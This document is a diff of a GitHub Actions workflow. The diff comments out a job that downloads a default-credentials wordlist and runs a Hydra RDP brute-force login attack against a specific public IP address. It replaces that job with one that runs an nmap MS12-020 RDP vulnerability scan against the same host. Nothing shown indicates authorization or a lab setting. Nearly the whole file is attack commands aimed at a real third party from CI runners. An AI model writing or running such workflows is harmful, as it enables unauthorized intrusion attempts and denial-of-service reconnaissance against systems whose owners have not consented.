@@ -3,14 +3,25 @@ on:
   workflow_dispatch:
 
 jobs:
-  Hydra:
+#  Hydra:
+#    runs-on: ubuntu-latest
+#    steps:
+#      - uses: actions/checkout@v2         
+#      - name: Install Dependencies
+#        run: |
+#         sudo apt-get install hydra-gtk
+#         wget --quiet https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt -O default.txt
+#      - name: Hydra-RDP
+#        run: |
+#         hydra -V -f -C default.txt rdp://<ip> 
+         
+  NMAP:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v2         
       - name: Install Dependencies
         run: |
-         sudo apt-get install hydra-gtk
-         wget --quiet https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt -O default.txt
-      - name: Hydra-RDP
+         sudo apt-get update && sudo apt-get install nmap -y
+      - name: NMAP-RDP-DOS Checker
         run: |
-         hydra -V -f -C default.txt rdp://96.65.26.181 
+         nmap -sV --script=rdp-vuln-ms12-020 -p 3389 96.65.26.181 -v
